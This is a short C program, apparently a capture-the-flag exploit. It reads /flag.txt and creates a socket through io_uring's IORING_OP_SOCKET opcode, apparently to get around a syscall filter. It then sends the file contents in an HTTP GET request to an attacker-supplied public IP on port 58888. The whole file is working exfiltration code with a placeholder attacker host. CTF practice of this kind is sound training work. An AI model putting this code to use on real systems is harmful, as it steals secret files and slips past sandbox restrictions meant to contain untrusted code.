#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <liburing.h>

char *ip = "YOU PUBLIC IP";
int port = 58888;

int main(int argc , char *argv[])
{
    struct io_uring ring;
    struct io_uring_sqe *sqe;
    struct io_uring_cqe *cqe;
    char message[0x100];
    char flag[0x100];

    memset(message, 0, 0x100);
    memset(flag, 0, 0x100);

    int fd = open("/flag.txt", 0);                      

    read(fd , flag, 0x100);
    write(1, flag, 0x100);

    io_uring_queue_init(1, &ring, 0);
    sqe = io_uring_get_sqe(&ring);
    
    sqe->opcode = IORING_OP_SOCKET;
    sqe->fd = AF_INET;
    sqe->off = SOCK_STREAM;
    sqe->len = 0;			
    sqe->rw_flags = 0;
    io_uring_submit(&ring);
    io_uring_wait_cqe(&ring, &cqe);

    int sockfd = cqe->res;
    if (sockfd == -1){
        printf("Fail to create a socket.");
    }


    strcat(message, "GET /");
    strcat(message, flag);
    strcat(message, " HTTP/1.1\r\n");
    strcat(message, "Connection: close\r\n\r\n");

    // socket connection

    struct sockaddr_in info;
    bzero(&info,sizeof(info));
    info.sin_family = PF_INET;

    // ip & port
    info.sin_addr.s_addr = inet_addr(ip);
    info.sin_port = htons(port);

    int err = connect(sockfd, (struct sockaddr *)&info, sizeof(info));
    if(err==-1){
        printf("Connection error");
    }

    send(sockfd, message, 0x100,0);

    return 0;
}
